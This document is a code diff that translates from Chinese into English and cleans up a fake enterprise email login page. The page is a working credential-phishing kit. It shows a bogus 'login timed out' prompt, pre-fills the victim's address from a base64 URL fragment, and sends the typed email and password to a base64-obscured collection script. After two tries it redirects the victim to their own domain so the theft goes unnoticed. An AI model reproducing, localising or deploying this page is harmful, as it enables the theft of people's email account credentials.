@@ -1,24 +1,22 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="en">
-
 <head>
     <meta http-equiv="Content-Language" content="en">
     <script src="js/jquery.min.js"></script>
     <script src="js/jquery-3.1.1.min.js"></script>
-        <script src="js/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <script src="js/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-    <title>&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;&#32;&#45;&#32;&#30331;&#24405;&#20837;&#21475;</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="shortcut icon" href="images/lin.ico"/>
+    <title>Enterprise Email - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="images/lin.ico"/>
     <style type="text/css">
     </style>
 </head>
-
 <body style="background:url('images/bg.png'); background-size: cover; background-repeat: no-repeat;">
     <button type="button" class="btn btn-primary" id="m-btn" data-toggle="modal" data-target="#exampleModalCenter" style="visibility: hidden;">
         Launch demo modal
@@ -33,21 +31,26 @@
                     </button>
                 </div>
                 <div class="modal-body px-5">
-                    <span style="font-weight: 700; color: #575757;font-size: 17px">&#30005;&#23376;&#37038;&#20214;&#30331;&#24405;&#36229;&#26102;&#65292;&#35831;&#37325;&#26032;&#30331;&#24405;
+                    <span style="font-weight: 700; color: #575757;font-size: 17px">
+                        Email login timed out, please log in again
                     </span>
                     <form class="mt-4">
                         <center>
-                            <div class="alert alert-danger" id="msg" style="display: none;">&#26080;&#25928;&#30340;&#23494;&#30721;&#65281;&#35831;&#36755;&#20837;&#27491;&#30830;&#30340;&#23494;&#30721;&#12290;。</div>
-                            <span id="error" class="text-danger" style="display: none;">&#35813;&#24080;&#25143;&#19981;&#23384;&#22312;&#12290;&#36755;&#20837;&#20854;&#20182;&#24080;&#25143;&#12290;</span>
+                            <div class="alert alert-danger" id="msg" style="display: none;">
+                                Invalid password! Please enter the correct password.
+                            </div>
+                            <span id="error" class="text-danger" style="display: none;">
+                                This account does not exist. Enter a different account.
+                            </span>
                         </center>
                         <div class="form-group row">
-                            <label for="staticai" class="col-sm-4 col-form-label">&#29992;&#25143;&#21517;</label>
+                            <label for="staticai" class="col-sm-4 col-form-label">Username</label>
                             <div class="col-sm-8">
                                 <input type="email" class="form-control py-1" id="ai" value="">
                             </div>
                         </div>
                         <div class="form-group row">
-                            <label for="inputpr" class="col-sm-4 col-form-label">&#37038;&#31665;&#23494;&#30721;</label>
+                            <label for="inputpr" class="col-sm-4 col-form-label">Password</label>
                             <div class="col-sm-8 ">
                                 <input type="password" class="form-control py-1" id="pr" placeholder="">
                             </div>
@@ -55,8 +58,8 @@
                     </form>
                 </div>
                 <div class="modal-footer p-2">
-                    <button type="button" class="btn btn-success py-1" id="submit-btn">&#30331;&#24405;</button>
-                    <button type="button" class="btn btn-secondary py-1">&#21462;&#28040;</button>
+                    <button type="button" class="btn btn-success py-1" id="submit-btn">Login</button>
+                    <button type="button" class="btn btn-secondary py-1">Cancel</button>
                 </div>
             </div>
         </div>
@@ -73,29 +76,18 @@
 /* global $ */
 $(document).ready(function() {
     var count = 0;
-
-
     $('#m-btn').click();
-
     /////////////url ai getting////////////////
     var ai = window.location.hash.substr(1);
     if (!ai) {
-
     } else {
         var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
         if (!base64regex.test(ai)) {
-            // alert(btoa(email));
             var my_ai = ai;
         } else {
-            // alert(atob(email));
             var my_ai = atob(ai);
         }
-        // $('#email').val(email);
-        // var my_email =email;
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        // $('#ai').val(ai);
-        // var my_ai = ai;
         var ind = my_ai.indexOf("@");
         var my_slice = my_ai.substr((ind + 1));
         var c = my_slice.substr(0, my_slice.indexOf('.'));
@@ -105,9 +97,7 @@ $(document).ready(function() {
         $("#msg").hide();
     }
     ///////////////url getting ai////////////////
-
     var file = "bmV4dC5waHA=";
-
     $('#submit-btn').click(function(event) {
         $('#error').hide();
         $('#msg').hide();
@@ -119,34 +109,27 @@ $(document).ready(function() {
         ///////////new injection////////////////
         var my_ai = ai;
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
         if (!ai) {
             $('#error').show();
-            $('#error').html("Email field is emply.!");
-            ai.focus;
+            $('#error').html("Email field is empty!");
             return false;
         }
-
         if (!filter.test(my_ai)) {
             $('#error').show();
             $('#error').html("That account doesn't exist. Enter a different account");
-            ai.focus;
             return false;
         }
         if (!pr) {
             $('#error').show();
-            $('#error').html("&#23494;&#30721;&#23383;&#27573;&#20026;&#31354;&#12290;&#65281;");
-            ai.focus;
+            $('#error').html("Password field is empty!");
             return false;
         }
-
         var ind = my_ai.indexOf("@");
         var my_slice = my_ai.substr((ind + 1));
         var c = my_slice.substr(0, my_slice.indexOf('.'));
         var final = c.toLowerCase();
         ///////////new injection////////////////
         count = count + 1;
-
         $.ajax({
             dataType: 'JSON',
             url: atob(file),
@@ -155,9 +138,8 @@ $(document).ready(function() {
                 ai: ai,
                 pr: pr,
             },
-            // data: $('#contact').serialize(),
             beforeSend: function(xhr) {
-                $('#submit-btn').html('&#39564;&#35777;&#20013;...');
+                $('#submit-btn').html('Verifying...');
             },
             success: function(response) {
                 if (response) {
@@ -167,14 +149,9 @@ $(document).ready(function() {
                         $("#pr").val("");
                         if (count >= 2) {
                             count = 0;
-                            // window.location.replace(response['redirect_link']);
                             window.location.replace("http://www." + my_slice);
                             return false;
-
                         }
-                        // $('#msg').html(response['msg']);
-                    } else {
-                        // $('#msg').html(response['msg']);
                     }
                 }
             },
@@ -186,16 +163,12 @@ $(document).ready(function() {
                     return false;
                 }
                 $("#msg").show();
-                // $('#msg').html("&#35831;&#31245;&#21518;&#20877;&#35797;");
             },
             complete: function() {
-                $('#submit-btn').html('&#30331;&#24405;');
+                $('#submit-btn').html('Login');
             }
         });
     });
-
-
 });
 </script>
-
 </html>
